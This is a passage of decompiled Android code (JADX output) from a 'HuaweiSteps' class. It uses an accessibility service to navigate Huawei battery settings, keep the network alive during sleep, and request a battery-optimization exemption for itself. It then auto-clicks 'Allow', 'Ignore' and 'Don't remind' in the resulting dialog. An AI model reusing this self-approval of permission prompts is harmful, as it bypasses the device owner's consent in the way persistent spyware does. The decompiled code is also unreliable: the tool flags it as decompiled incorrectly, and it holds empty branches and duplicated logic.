                                    huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                    huaweiSteps$executeBatteryOptimization$1.f54018a6 = 4;
                                    if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                                    }
                                    i7++;
                                    if (i7 < 3) {
                                    }
                                } else {
                                    huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                    huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                    huaweiSteps$executeBatteryOptimization$1.f54018a6 = 5;
                                    if (b81.m210571b1(800L, huaweiSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                                        if (c0365a2.m212189e3()) {
                                            t60.m214704c5("HuaweiSteps", "[电池] 未进入电池页面");
                                            if (i7 >= i8) {
                                                t60.m214704c5("HuaweiSteps", "[电池] 2次尝试均失败，标记完成并退出");
                                                c0365a2.m212195f2(c0365a2.f55070a8);
                                                return c1351vv;
                                            }
                                            t60.m214704c5("HuaweiSteps", "[电池] 重新整个流程（第" + (i7 + 1) + "次）");
                                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = 6;
                                            if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                                            }
                                            i7++;
                                            if (i7 < 3) {
                                            }
                                        } else {
                                            t60.m214704c5("HuaweiSteps", "[电池] 步骤3: 处理性能模式和省电模式");
                                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = 7;
                                            if (c0365a2.m212184d8(huaweiSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                                                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 8;
                                                if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                                                }
                                                c0365a2.m212195f2(c0365a2.f55067a5);
                                                t60.m214704c5("HuaweiSteps", "[电池] 步骤4: 滚动查找'更多电池设置'");
                                                i = 0;
                                                i5 = 1;
                                                if (i5 < 3) {
                                                    t60.m214704c5("HuaweiSteps", "[电池] 第" + i5 + "次尝试进入更多电池设置");
                                                    huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                                    huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                                    huaweiSteps$executeBatteryOptimization$1.f54014a2 = i;
                                                    huaweiSteps$executeBatteryOptimization$1.f54015a3 = i5;
                                                    huaweiSteps$executeBatteryOptimization$1.f54018a6 = 9;
                                                    Object objM212206g3 = c0365a2.m212206g3(3, "更多电池设置", huaweiSteps$executeBatteryOptimization$1, true);
                                                    if (objM212206g3 != coroutineSingletons) {
                                                        int i9 = i5;
                                                        i2 = i7;
                                                        i4 = i9;
                                                        c0365a22 = c0365a2;
                                                        i3 = i;
                                                        objM212174c1 = objM212206g3;
                                                        if (((Boolean) objM212174c1).booleanValue()) {
                                                            t60.m214704c5("HuaweiSteps", "[电池] 未进入更多电池设置，重新打开设置");
                                                            c0365a22.f55063a1.performGlobalAction(1);
                                                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                                                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                                                            huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                                                            huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                                                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = 11;
                                                            if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                                                            }
                                                        } else {
                                                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                                                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                                                            huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                                                            huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                                                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = 10;
                                                            if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                                                            }
                                                            if (c0365a22.m212190e5()) {
                                                                t60.m214704c5("HuaweiSteps", "[电池] 已进入更多电池设置");
                                                                i = 1;
                                                                i7 = i2;
                                                                c0365a2 = c0365a22;
                                                                if (i != 0) {
                                                                    t60.m214704c5("HuaweiSteps", "[电池] 无法进入更多电池设置，跳过");
                                                                    if (i7 >= 2) {
                                                                        c0365a2.m212195f2(c0365a2.f55070a8);
                                                                        return c1351vv;
                                                                    }
                                                                    huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                                                    huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                                                    huaweiSteps$executeBatteryOptimization$1.f54018a6 = 15;
                                                                    if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                                                                        i8 = 2;
                                                                        i7++;
                                                                        if (i7 < 3) {
                                                                        }
                                                                    }
                                                                } else {
                                                                    c0365a2.m212195f2(c0365a2.f55068a6);
                                                                    t60.m214704c5("HuaweiSteps", "[电池] 步骤5: 开启'休眠时始终保持网络连接'");
                                                                    c0365a2.m212208g6("休眠时始终保持网络连接", true);
                                                                    huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                                                                    huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                                                                    huaweiSteps$executeBatteryOptimization$1.f54018a6 = 16;
                                                                    if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                                                                    }
                                                                    c0365a2.m212195f2(c0365a2.f55069a7);
                                                                    t60.m214704c5("HuaweiSteps", "[电池] 完成");
                                                                }
                                                            }
                                                            t60.m214704c5("HuaweiSteps", "[电池] 未进入更多电池设置，重新打开设置");
                                                            c0365a22.f55063a1.performGlobalAction(1);
                                                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                                                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                                                            huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                                                            huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                                                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = 11;
                                                            if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                                                                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                                                                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                                                                huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                                                                huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                                                                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 12;
                                                                objM212174c1 = c0365a22.m212197f4(huaweiSteps$executeBatteryOptimization$1);
                                                                if (objM212174c1 == coroutineSingletons) {
                                                                    if (((Boolean) objM212174c1).booleanValue()) {
                                                                        huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                                                                        huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                                                                        huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                                                                        huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                                                                        huaweiSteps$executeBatteryOptimization$1.f54018a6 = 13;
                                                                        objM212174c1 = c0365a22.m212174c1(huaweiSteps$executeBatteryOptimization$1);
                                                                        if (objM212174c1 != coroutineSingletons) {
                                                                            if (((Boolean) objM212174c1).booleanValue()) {
                                                                                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                                                                                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                                                                                huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                                                                                huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                                                                                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 14;
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                    i = i3;
                                                                    c0365a2 = c0365a22;
                                                                    int i10 = i2;
                                                                    i5 = i4 + 1;
                                                                    i7 = i10;
                                                                    if (i5 < 3) {
                                                                        if (i != 0) {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                c0365a2.m212195f2(c0365a2.f55070a8);
                return c1351vv;
            case 1:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (((Boolean) objM212174c1).booleanValue()) {
                }
                return coroutineSingletons;
            case 2:
            case 4:
            case 6:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                i7++;
                if (i7 < 3) {
                }
                c0365a2.m212195f2(c0365a2.f55070a8);
                return c1351vv;
            case 3:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (((Boolean) objM212174c1).booleanValue()) {
                }
                return coroutineSingletons;
            case 5:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (c0365a2.m212189e3()) {
                }
                return coroutineSingletons;
            case 7:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 8;
                if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                }
                c0365a2.m212195f2(c0365a2.f55067a5);
                t60.m214704c5("HuaweiSteps", "[电池] 步骤4: 滚动查找'更多电池设置'");
                i = 0;
                i5 = 1;
                if (i5 < 3) {
                }
                return coroutineSingletons;
            case 8:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                c0365a2.m212195f2(c0365a2.f55067a5);
                t60.m214704c5("HuaweiSteps", "[电池] 步骤4: 滚动查找'更多电池设置'");
                i = 0;
                i5 = 1;
                if (i5 < 3) {
                }
                return coroutineSingletons;
            case 9:
                i4 = huaweiSteps$executeBatteryOptimization$1.f54015a3;
                i3 = huaweiSteps$executeBatteryOptimization$1.f54014a2;
                i2 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a22 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (((Boolean) objM212174c1).booleanValue()) {
                }
                return coroutineSingletons;
            case 10:
                i4 = huaweiSteps$executeBatteryOptimization$1.f54015a3;
                i3 = huaweiSteps$executeBatteryOptimization$1.f54014a2;
                i2 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a22 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (c0365a22.m212190e5()) {
                }
                t60.m214704c5("HuaweiSteps", "[电池] 未进入更多电池设置，重新打开设置");
                c0365a22.f55063a1.performGlobalAction(1);
                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 11;
                if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                i4 = huaweiSteps$executeBatteryOptimization$1.f54015a3;
                i3 = huaweiSteps$executeBatteryOptimization$1.f54014a2;
                i2 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a22 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a22;
                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i2;
                huaweiSteps$executeBatteryOptimization$1.f54014a2 = i3;
                huaweiSteps$executeBatteryOptimization$1.f54015a3 = i4;
                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 12;
                objM212174c1 = c0365a22.m212197f4(huaweiSteps$executeBatteryOptimization$1);
                if (objM212174c1 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                i4 = huaweiSteps$executeBatteryOptimization$1.f54015a3;
                i3 = huaweiSteps$executeBatteryOptimization$1.f54014a2;
                i2 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a22 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (((Boolean) objM212174c1).booleanValue()) {
                }
                i = i3;
                c0365a2 = c0365a22;
                int i102 = i2;
                i5 = i4 + 1;
                i7 = i102;
                if (i5 < 3) {
                }
                return coroutineSingletons;
            case 13:
                i4 = huaweiSteps$executeBatteryOptimization$1.f54015a3;
                i3 = huaweiSteps$executeBatteryOptimization$1.f54014a2;
                i2 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a22 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                if (((Boolean) objM212174c1).booleanValue()) {
                }
                i = i3;
                c0365a2 = c0365a22;
                int i1022 = i2;
                i5 = i4 + 1;
                i7 = i1022;
                if (i5 < 3) {
                }
                return coroutineSingletons;
            case 14:
                i4 = huaweiSteps$executeBatteryOptimization$1.f54015a3;
                i3 = huaweiSteps$executeBatteryOptimization$1.f54014a2;
                i2 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a22 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                i = i3;
                c0365a2 = c0365a22;
                int i10222 = i2;
                i5 = i4 + 1;
                i7 = i10222;
                if (i5 < 3) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                i8 = 2;
                i7++;
                if (i7 < 3) {
                }
                c0365a2.m212195f2(c0365a2.f55070a8);
                return c1351vv;
            case 16:
                int i11 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                c0365a2.m212195f2(c0365a2.f55069a7);
                t60.m214704c5("HuaweiSteps", "[电池] 完成");
                c0365a2.m212195f2(c0365a2.f55070a8);
                return c1351vv;
            case 17:
                i7 = huaweiSteps$executeBatteryOptimization$1.f54013a1;
                c0365a2 = huaweiSteps$executeBatteryOptimization$1.f54012a0;
                kg1.m213544f4(objM212174c1);
                i7++;
                if (i7 < 3) {
                }
                c0365a2.m212195f2(c0365a2.f55070a8);
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:72:0x015d, code lost:
    
        p000.t60.m214704c5("HuaweiSteps", "[电池白名单] 弹窗已出现");
        r4 = 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:97:0x0209, code lost:
    
        if (p000.b81.m210571b1(100, r5) == r6) goto L116;
     */
    /* JADX WARN: Removed duplicated region for block: B:106:0x023d  */
    /* JADX WARN: Removed duplicated region for block: B:107:0x023e  */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0244  */
    /* JADX WARN: Removed duplicated region for block: B:111:0x0247 A[Catch: Exception -> 0x005a, TRY_LEAVE, TryCatch #2 {Exception -> 0x005a, blocks: (B:20:0x0053, B:108:0x0240, B:111:0x0247, B:88:0x01cf, B:90:0x01d3, B:92:0x01dc, B:96:0x01f8, B:104:0x022a, B:93:0x01f2, B:25:0x0065, B:28:0x0071, B:77:0x0179, B:51:0x00fe, B:53:0x0106, B:56:0x0115, B:58:0x011c, B:60:0x012f, B:62:0x0137, B:64:0x013f, B:66:0x0148, B:68:0x0150, B:72:0x015d, B:73:0x0164, B:79:0x0183, B:80:0x0188, B:31:0x007b, B:44:0x00c1), top: B:124:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:116:0x0266 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:117:0x0267 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:120:0x01b0 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00fe A[Catch: Exception -> 0x005a, TryCatch #2 {Exception -> 0x005a, blocks: (B:20:0x0053, B:108:0x0240, B:111:0x0247, B:88:0x01cf, B:90:0x01d3, B:92:0x01dc, B:96:0x01f8, B:104:0x022a, B:93:0x01f2, B:25:0x0065, B:28:0x0071, B:77:0x0179, B:51:0x00fe, B:53:0x0106, B:56:0x0115, B:58:0x011c, B:60:0x012f, B:62:0x0137, B:64:0x013f, B:66:0x0148, B:68:0x0150, B:72:0x015d, B:73:0x0164, B:79:0x0183, B:80:0x0188, B:31:0x007b, B:44:0x00c1), top: B:124:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x0183 A[Catch: Exception -> 0x005a, TryCatch #2 {Exception -> 0x005a, blocks: (B:20:0x0053, B:108:0x0240, B:111:0x0247, B:88:0x01cf, B:90:0x01d3, B:92:0x01dc, B:96:0x01f8, B:104:0x022a, B:93:0x01f2, B:25:0x0065, B:28:0x0071, B:77:0x0179, B:51:0x00fe, B:53:0x0106, B:56:0x0115, B:58:0x011c, B:60:0x012f, B:62:0x0137, B:64:0x013f, B:66:0x0148, B:68:0x0150, B:72:0x015d, B:73:0x0164, B:79:0x0183, B:80:0x0188, B:31:0x007b, B:44:0x00c1), top: B:124:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001d  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:107:0x023e -> B:108:0x0240). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:76:0x0177 -> B:77:0x0179). Please report as a decompilation issue!!! */
    /* renamed from: b3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212166b3(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeBatteryWhitelist$1 huaweiSteps$executeBatteryWhitelist$1;
        C0365a2 c0365a2;
        C0365a2 c0365a22;
        int i;
        int i2;
        C0365a2 c0365a23;
        int i3;
        int i4;
        String[] strArr;
        int i5;
        boolean z;
        Context context = this.f55062a0;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$executeBatteryWhitelist$1) {
            huaweiSteps$executeBatteryWhitelist$1 = (HuaweiSteps$executeBatteryWhitelist$1) continuationImpl;
            int i6 = huaweiSteps$executeBatteryWhitelist$1.f54025a6;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeBatteryWhitelist$1.f54025a6 = i6 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeBatteryWhitelist$1 = new HuaweiSteps$executeBatteryWhitelist$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$executeBatteryWhitelist$1.f54023a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = huaweiSteps$executeBatteryWhitelist$1.f54025a6;
        try {
        } catch (Exception e) {
            tz0.m214807a7("[电池白名单] 失败: ", e.getMessage(), "HuaweiSteps");
        }
        if (i7 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5("HuaweiSteps", "[电池白名单] 检查是否已忽略电池优化");
            String str = this.f55076b4;
            if (m212193f0(str)) {
                t60.m214704c5("HuaweiSteps", "[电池白名单] 已标记完成，跳过");
                return c1351vv;
            }
            try {
                Object systemService = context.getSystemService("power");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                if (((PowerManager) systemService).isIgnoringBatteryOptimizations(context.getPackageName())) {
                    t60.m214704c5("HuaweiSteps", "[电池白名单] 已在白名单中");
                    m212195f2(str);
                    return c1351vv;
                }
            } catch (Exception e2) {
                tz0.m214807a7("[电池白名单] 检查失败: ", e2.getMessage(), "HuaweiSteps");
            }
            t60.m214704c5("HuaweiSteps", "[电池白名单] 请求加入白名单");
            Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.setFlags(276824064);
            this.f55063a1.startActivity(intent);
            huaweiSteps$executeBatteryWhitelist$1.f54019a0 = this;
            huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 1;
            if (b81.m210571b1(300L, huaweiSteps$executeBatteryWhitelist$1) != coroutineSingletons) {
                c0365a2 = this;
            }
        } else if (i7 == 1) {
            c0365a2 = huaweiSteps$executeBatteryWhitelist$1.f54019a0;
            kg1.m213544f4(obj);
        } else if (i7 == 2) {
            i = huaweiSteps$executeBatteryWhitelist$1.f54022a3;
            i2 = huaweiSteps$executeBatteryWhitelist$1.f54021a2;
            c0365a22 = huaweiSteps$executeBatteryWhitelist$1.f54019a0;
            kg1.m213544f4(obj);
            char c = 2;
            i++;
            if (i < 6) {
                AccessibilityNodeInfo rootInActiveWindow = c0365a22.f55063a1.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    ArrayList arrayList = new ArrayList();
                    m212145a7(rootInActiveWindow, arrayList);
                    if (!arrayList.isEmpty()) {
                        int size = arrayList.size();
                        int i8 = 0;
                        while (i8 < size) {
                            Object obj2 = arrayList.get(i8);
                            i8++;
                            String str2 = (String) obj2;
                            if (AbstractC0779a1.m213652a5(str2, "忽略", false) || AbstractC0779a1.m213652a5(str2, "电池", false) || AbstractC0779a1.m213652a5(str2, "优化", false) || AbstractC0779a1.m213652a5(str2, "Ignore", true) || AbstractC0779a1.m213652a5(str2, "Battery", true) || AbstractC0779a1.m213652a5(str2, "Optimize", true)) {
                                break;
                            }
                        }
                    }
                }
                huaweiSteps$executeBatteryWhitelist$1.f54019a0 = c0365a22;
                huaweiSteps$executeBatteryWhitelist$1.f54021a2 = i2;
                huaweiSteps$executeBatteryWhitelist$1.f54022a3 = i;
                c = 2;
                huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 2;
                if (b81.m210571b1(100L, huaweiSteps$executeBatteryWhitelist$1) != coroutineSingletons) {
                    i++;
                    if (i < 6) {
                    }
                }
            }
            if (i2 == 0) {
                t60.m214704c5("HuaweiSteps", "[电池白名单] 弹窗未出现，可能已经在白名单中");
            }
            c0365a23 = c0365a22;
            i3 = 0;
            i4 = 0;
            strArr = new String[]{"忽略", "关闭", "不优化", "允许", "确定", "不再提醒", "知道了", "Ignore", "Close", "Don't optimize", "Allow", "OK", "Don't remind", "Got it"};
            if (i3 >= 30) {
            }
        } else if (i7 == 3) {
            i3 = huaweiSteps$executeBatteryWhitelist$1.f54022a3;
            i4 = huaweiSteps$executeBatteryWhitelist$1.f54021a2;
            strArr = huaweiSteps$executeBatteryWhitelist$1.f54020a1;
            c0365a23 = huaweiSteps$executeBatteryWhitelist$1.f54019a0;
            kg1.m213544f4(obj);
            Object systemService2 = c0365a23.f55062a0.getSystemService("power");
            t60.m214693b4(systemService2, "null cannot be cast to non-null type android.os.PowerManager");
            if (((PowerManager) systemService2).isIgnoringBatteryOptimizations(c0365a23.f55062a0.getPackageName())) {
                t60.m214704c5("HuaweiSteps", "[电池白名单] 验证成功：已加入白名单");
                i5 = 1;
                if (i5 != 0) {
                }
                huaweiSteps$executeBatteryWhitelist$1.f54019a0 = null;
                huaweiSteps$executeBatteryWhitelist$1.f54020a1 = null;
                huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 5;
                if (b81.m210571b1(100L, huaweiSteps$executeBatteryWhitelist$1) == coroutineSingletons) {
                }
            }
            huaweiSteps$executeBatteryWhitelist$1.f54019a0 = c0365a23;
            huaweiSteps$executeBatteryWhitelist$1.f54020a1 = strArr;
            huaweiSteps$executeBatteryWhitelist$1.f54021a2 = i4;
            huaweiSteps$executeBatteryWhitelist$1.f54022a3 = i3;
            huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 4;
            if (b81.m210571b1(100L, huaweiSteps$executeBatteryWhitelist$1) == coroutineSingletons) {
            }
        } else {
            if (i7 != 4) {
                if (i7 != 5) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return c1351vv;
            }
            i3 = huaweiSteps$executeBatteryWhitelist$1.f54022a3;
            i4 = huaweiSteps$executeBatteryWhitelist$1.f54021a2;
            strArr = huaweiSteps$executeBatteryWhitelist$1.f54020a1;
            c0365a23 = huaweiSteps$executeBatteryWhitelist$1.f54019a0;
            kg1.m213544f4(obj);
            i3++;
            if (i3 >= 30) {
                Object systemService3 = c0365a23.f55062a0.getSystemService("power");
                t60.m214693b4(systemService3, "null cannot be cast to non-null type android.os.PowerManager");
                if (((PowerManager) systemService3).isIgnoringBatteryOptimizations(c0365a23.f55062a0.getPackageName())) {
                    t60.m214704c5("HuaweiSteps", "[电池白名单] 已成功加入白名单");
                    i5 = 1;
                    if (i5 != 0) {
                        c0365a23.m212195f2(c0365a23.f55076b4);
                    }
                    huaweiSteps$executeBatteryWhitelist$1.f54019a0 = null;
                    huaweiSteps$executeBatteryWhitelist$1.f54020a1 = null;
                    huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 5;
                    return b81.m210571b1(100L, huaweiSteps$executeBatteryWhitelist$1) == coroutineSingletons ? coroutineSingletons : c1351vv;
                }
                int length = strArr.length;
                int i9 = 0;
                while (true) {
                    if (i9 >= length) {
                        z = false;
                        break;
                    }
                    String str3 = strArr[i9];
                    if (c0365a23.m212160a3(str3, true)) {
                        t60.m214704c5("HuaweiSteps", "[电池白名单] 点击: " + str3);
                        z = true;
                        break;
                    }
                    i9++;
                }
                if (z) {
                    huaweiSteps$executeBatteryWhitelist$1.f54019a0 = c0365a23;
                    huaweiSteps$executeBatteryWhitelist$1.f54020a1 = strArr;
                    huaweiSteps$executeBatteryWhitelist$1.f54021a2 = i4;
                    huaweiSteps$executeBatteryWhitelist$1.f54022a3 = i3;
                    huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 3;
                } else {
                    huaweiSteps$executeBatteryWhitelist$1.f54019a0 = c0365a23;
                    huaweiSteps$executeBatteryWhitelist$1.f54020a1 = strArr;
                    huaweiSteps$executeBatteryWhitelist$1.f54021a2 = i4;
                    huaweiSteps$executeBatteryWhitelist$1.f54022a3 = i3;
                    huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 4;
                    if (b81.m210571b1(100L, huaweiSteps$executeBatteryWhitelist$1) == coroutineSingletons) {
                        i3++;
                        if (i3 >= 30) {
                            i5 = i4;
                            if (i5 != 0) {
                            }
                            huaweiSteps$executeBatteryWhitelist$1.f54019a0 = null;
                            huaweiSteps$executeBatteryWhitelist$1.f54020a1 = null;
                            huaweiSteps$executeBatteryWhitelist$1.f54025a6 = 5;
                            if (b81.m210571b1(100L, huaweiSteps$executeBatteryWhitelist$1) == coroutineSingletons) {
                            }
                        }
                    }
                }
            }
        }
        c0365a22 = c0365a2;
        i = 1;
        i2 = 0;
        if (i < 6) {
        }
        if (i2 == 0) {
        }
        c0365a23 = c0365a22;
        i3 = 0;
        i4 = 0;
        strArr = new String[]{"忽略", "关闭", "不优化", "允许", "确定", "不再提醒", "知道了", "Ignore", "Close", "Don't optimize", "Allow", "OK", "Don't remind", "Got it"};
        if (i3 >= 30) {
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:115:0x02f2, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L116;
     */
    /* JADX WARN: Removed duplicated region for block: B:32:0x008c  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212167b4(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeClearRecentTasks$1 huaweiSteps$executeClearRecentTasks$1;
        C0365a2 c0365a2;
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        if (continuationImpl instanceof HuaweiSteps$executeClearRecentTasks$1) {
            huaweiSteps$executeClearRecentTasks$1 = (HuaweiSteps$executeClearRecentTasks$1) continuationImpl;
            int i = huaweiSteps$executeClearRecentTasks$1.f54029a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeClearRecentTasks$1.f54029a3 = i - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeClearRecentTasks$1 = new HuaweiSteps$executeClearRecentTasks$1(this, continuationImpl);
            }
        }
        Object objM212209g7 = huaweiSteps$executeClearRecentTasks$1.f54027a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = huaweiSteps$executeClearRecentTasks$1.f54029a3;
        boolean z = true;
        if (i2 == 0) {
            kg1.m213544f4(objM212209g7);
